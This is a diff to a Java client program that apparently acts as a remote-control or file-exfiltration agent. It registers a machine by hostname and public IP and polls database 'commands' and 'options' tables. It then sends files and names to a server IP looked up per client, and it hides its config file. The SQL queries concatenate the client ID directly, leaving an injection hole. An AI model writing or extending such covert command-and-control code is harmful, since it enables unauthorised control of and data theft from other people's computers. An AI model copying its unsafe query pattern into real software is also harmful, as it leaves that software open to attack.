@@ -47,7 +47,8 @@ public static void main(String[] args) throws Exception{
 				String loc=hostName();
 				 String ip1=MyIp();
 				String id=Id();
-			String ip=Ip();
+			
+			
 			int lenConn=CanConnect(conn,id,ip1,loc);
 			int optLen=OptionsLen(conn,id,ip1,loc);
 			if(getClientsLen(conn,Id(),MyIp(),loc)==0) 
@@ -62,14 +63,14 @@ public static void main(String[] args) throws Exception{
 			
 		if(lenConn==1&&optLen==0) {
 		
-		SendFiles(getCommand(conn,id,ip1,loc),conn,id,ip,ip1,loc);
+		SendFiles(getCommand(conn,id,ip1,loc),conn,id,CommandIp(conn,id),ip1,loc);
 	
 	
 
 		}else if(optLen==1) 
 		{
 		
-			SendNames(conn,getOption(conn,id,ip1,loc),id,ip,ip1,loc);
+			SendNames(conn,getOption(conn,id,ip1,loc),id,OptionIp(conn,id),ip1,loc);
 			
 		}
 		
@@ -237,25 +238,20 @@ public static String Id()
 	}
 	return host;	
 }
-public static String Ip() 
+public static String CommandIp(Connection conn,String id) throws Exception 
 {
-	File configFile = new File(System.getProperty("user.dir")+"\\.conf.properties");
-	String host=null;
-	try {
-	    FileReader reader = new FileReader(configFile);
-	    Properties props = new Properties();
-	    props.load(reader);
-	 
-	    host = props.getProperty("IP");
-	 
-
-	    reader.close();
-	} catch (Exception ex) {
-	 
-	}
-	return host;	
+	Statement stmt = conn.createStatement();
+	String sql = "SELECT SerIp from commands Where id ="+"'"+id+"'";
+	ResultSet rs = stmt.executeQuery(sql);
+	String comm="";
+   while(rs.next()) {
+comm= rs.getString(1);
+   }
+stmt.close();
+    return comm;
+		
 }
-public static void WriteClientProperty(String id,String ip) throws Exception
+public static void WriteClientProperty(String id) throws Exception
 {
 	File theDir = new File(System.getProperty("user.dir")+"\\Clients");
 	if (!theDir.exists()){
@@ -263,10 +259,23 @@ public static void WriteClientProperty(String id,String ip) throws Exception
 	}
 	 Properties props = new Properties();
 	    props.setProperty("ID", id);
-        props.setProperty("IP", ip);
+     
 	    props.store(new FileOutputStream(theDir+"\\.conf.properties"), null);
         File f=new File(theDir+"\\.conf.properties");
         setHiddenAttrib(f);
+}
+public static String OptionIp(Connection conn,String id) throws Exception 
+{
+	Statement stmt = conn.createStatement();
+	String sql = "SELECT SerIp from options Where id ="+"'"+id+"'";
+	ResultSet rs = stmt.executeQuery(sql);
+	String comm="";
+   while(rs.next()) {
+comm= rs.getString(1);
+   }
+stmt.close();
+    return comm;
+		
 }
 private static void setHiddenAttrib(File file) throws Exception {
    
@@ -309,6 +318,7 @@ public static int getClientsLen(Connection conn,String id,String ip,String loc) 
     statement.close();
 return out;	
 }
+
 public static String MyIp() throws Exception 
 {
 	URL whatismyip = new URL("http://checkip.amazonaws.com");
@@ -318,6 +328,7 @@ public static String MyIp() throws Exception
 	String ip = in.readLine(); 	
 return ip;
 }
+
 public static String hostName() throws Exception
 {
 	 InetAddress ip;
@@ -333,4 +344,5 @@ public static String hostName() throws Exception
      
      return hostname;
 }
+
 }
